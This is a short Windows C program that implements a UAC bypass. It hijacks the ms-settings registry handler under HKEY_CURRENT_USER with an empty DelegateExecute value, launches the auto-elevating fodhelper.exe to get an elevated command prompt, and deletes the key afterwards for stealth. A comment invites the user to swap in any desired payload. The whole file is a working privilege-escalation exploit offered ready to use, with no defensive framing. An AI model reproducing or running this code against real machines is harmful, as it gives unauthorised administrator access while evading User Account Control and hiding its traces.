#include <windows.h>
#include <stdio.h>

int main(void) {
    HKEY hKey;
    DWORD dwDisposition;
    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const wchar_t* delegateCmd = L"";  // Empty DelegateExecute to force our command

    // Create the registry key for hijack
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
        // Set the command to run elevated
        const wchar_t* payload = L"C:\\Windows\\System32\\cmd.exe";  // CHANGE THIS TO YOUR DESIRED PAYLOAD
        const wchar_t* args   = L"/k whoami && echo SUCCESS - Elevated via Method 34 && pause";

        RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(wchar_t)));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)delegateCmd, (DWORD)((wcslen(delegateCmd) + 1) * sizeof(wchar_t)));

        RegCloseKey(hKey);

        // Trigger the auto-elevated binary (fodhelper.exe or similar - this one is still reliable on 25H2)
        ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

        printf("[+] Registry hijack set. Trigger sent. Check for elevated cmd.\n");
        Sleep(2000);  // Give time for elevation

        // Clean up registry (optional but stealthier)
        RegDeleteKeyW(HKEY_CURRENT_USER, regPath);
        printf("[+] Cleanup done.\n");
    } else {
        printf("[-] Failed to create registry key.\n");
    }

    return 0;
}
